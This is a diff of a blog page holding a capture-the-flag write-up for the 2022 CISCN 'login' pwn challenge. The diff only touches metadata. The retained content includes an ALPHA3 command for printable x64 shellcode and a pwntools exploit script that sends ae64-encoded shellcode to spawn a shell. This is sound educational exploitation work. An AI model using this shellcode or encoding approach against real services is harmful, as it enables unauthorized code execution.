@@ -129,15 +129,13 @@
 
 
 
-<meta name="description" content="login主要是对程序逻辑的分析和可见字符的shellcode的编写，同时要注意shellcode的编写规则，这里是使用rdx进行触发。   参考文章：(8条消息) 手把手教你写纯字符ascii shellcode——最通俗易懂的alphanumeric shellcode生成指南_TaQini852的博客-CSDN博客_ascii shellcode  使用alpha3的基本步骤：  pytho">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022 ciscn 初赛">
 <meta property="og:url" content="https://pursuezhou.github.io/2022/07/01/CTF/2022ciscn%E5%88%9D%E8%B5%9B/index.html">
 <meta property="og:site_name" content="Pursue">
-<meta property="og:description" content="login主要是对程序逻辑的分析和可见字符的shellcode的编写，同时要注意shellcode的编写规则，这里是使用rdx进行触发。   参考文章：(8条消息) 手把手教你写纯字符ascii shellcode——最通俗易懂的alphanumeric shellcode生成指南_TaQini852的博客-CSDN博客_ascii shellcode  使用alpha3的基本步骤：  pytho">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-06-30T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-13T12:07:48.167Z">
+<meta property="article:modified_time" content="2024-03-14T02:01:57.288Z">
 <meta property="article:author" content="Pursue">
 <meta property="article:tag" content="ciscn">
 <meta name="twitter:card" content="summary">
@@ -438,8 +436,6 @@
 <li><p>使用命令生成可见字符的shellcode</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rdx --input=&quot;shellcode_x64&quot;</span><br></pre></td></tr></table></figure></li>
 </ol>
-<span id="more"></span>
-
 <p>WP如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;47.93.176.13&#x27;, 25792)</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">TAYAXVI31VXPP[_Hc4:14:SX-&#125;/?w-x0An5C+&#123;(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-]oN&#125;-08/P5;W-vP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-!/o&gt;-uTX 5Xtp(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-~~/?-?!0,5GZ#SP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-^;?&#125;-w&quot; Z5#!f8P^14:WX-@``?-@??_-|``aP_Hc4:14:SX- ?^;-@@~@5%@VlP^14:WX-@``?-@??_-|``aP_SX- h#F- 9^@5X_~yP_Hc4:14:SX-W?/6-!@  5wb 9P^14:WX-@``?-@??_-|``aP_SX-.1o_-0wpx5&gt;V (P^SX-@~~7-Maaw5k  QP_AAAA|4oGf6^@nww`SjMMkct?=/w!&#123;~?&quot;uJ-&#x27;(R6sF`VUmo&#125;r__#33Vavp~0tS&lt;ZTC?Q-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)		<span class="comment"># 使用ae64生成的shellcode</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;msg:ro0t\r\nopt:1\n\n&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">&#x27;msg:&#x27;</span> + shellcode + <span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;opt:2\n\n&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -620,7 +616,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
